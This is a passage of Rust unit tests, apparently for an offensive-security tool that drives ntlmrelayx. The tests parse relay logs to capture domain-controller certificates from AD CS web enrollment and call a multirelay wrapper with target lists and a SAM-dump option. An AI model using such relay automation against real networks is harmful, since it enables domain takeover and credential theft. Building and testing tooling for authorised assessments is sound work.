        let (user, b64) = super::extract_cert_from_log(log).expect("should extract");
        assert_eq!(user, "DC2$");
        assert_eq!(b64, "MIIBlahSecondCert==");
    }

    #[test]
    fn extract_cert_from_log_returns_none_without_marker() {
        let log = "[*] Servers started\n[*] no auth received\n";
        assert!(super::extract_cert_from_log(log).is_none());
    }

    #[test]
    fn extract_pfx_capture_picks_adcs_pair() {
        // Real `--adcs` log shape captured during ntlmrelayx ADCS relay.
        let log = "\
[*] Servers started, waiting for connections\n\
[*] SMBD-Thread-3: Received connection from 192.168.58.20, attacking target http://192.168.58.10/certsrv/certfnsh.asp\n\
[*] (SMB): Authenticating against http://192.168.58.10/certsrv/certfnsh.asp CONTOSO/DC01$@192.168.58.20 SUCCEED [1]\n\
[*] GOT CERTIFICATE! ID 6\n\
[*] Writing PKCS#12 certificate to ./DC01.pfx\n\
[*] done\n";
        let cap = super::extract_pfx_capture_from_log(log).expect("should extract");
        assert_eq!(cap.user, "DC01$");
        assert_eq!(cap.pfx_basename, "./DC01.pfx");
    }

    #[test]
    fn extract_pfx_capture_falls_back_to_basename_without_user() {
        let log = "[*] Writing PKCS#12 certificate to ./MEMBER1.pfx\n";
        let cap = super::extract_pfx_capture_from_log(log).expect("should extract");
        assert_eq!(cap.user, "MEMBER1");
        assert_eq!(cap.pfx_basename, "./MEMBER1.pfx");
    }

    #[test]
    fn extract_pfx_capture_returns_none_without_pfx_marker() {
        let log = "[*] (SMB): Authenticating against ... CONTOSO/DC01$@192.168.58.20 SUCCEED\n[*] auth complete";
        assert!(super::extract_pfx_capture_from_log(log).is_none());
    }

    #[test]
    fn parse_relayed_user_handles_domain_user_dollar_at_ip() {
        assert_eq!(
            super::parse_relayed_user("blah CONTOSO/DC01$@192.168.58.20 SUCCEED"),
            Some("DC01$".to_string())
        );
        assert_eq!(
            super::parse_relayed_user("(SMB): Authenticating CONTOSO/jdoe@192.168.58.10"),
            Some("jdoe".to_string())
        );
    }

    #[test]
    fn parse_relayed_user_returns_none_when_no_user() {
        // Lines with `@` but not a `domain/user` shape — URL-only, e.g.
        assert_eq!(super::parse_relayed_user("[*] Connection to host"), None);
        assert_eq!(super::parse_relayed_user("user@host"), None); // no slash
    }

    #[tokio::test]
    async fn ntlmrelayx_multirelay_with_targets_file() {
        mock::push(mock::success());
        let args = json!({"targets_file": "/tmp/targets.txt"});
        assert!(ntlmrelayx_multirelay(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntlmrelayx_multirelay_with_target_ips() {
        mock::push(mock::success());
        let args = json!({"target_ips": "192.168.58.1,192.168.58.2", "dump_sam": true});
        assert!(ntlmrelayx_multirelay(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntlmrelayx_multirelay_no_targets() {
        mock::push(mock::success());
        let args = json!({});
        assert!(ntlmrelayx_multirelay(&args).await.is_ok());
    }
}
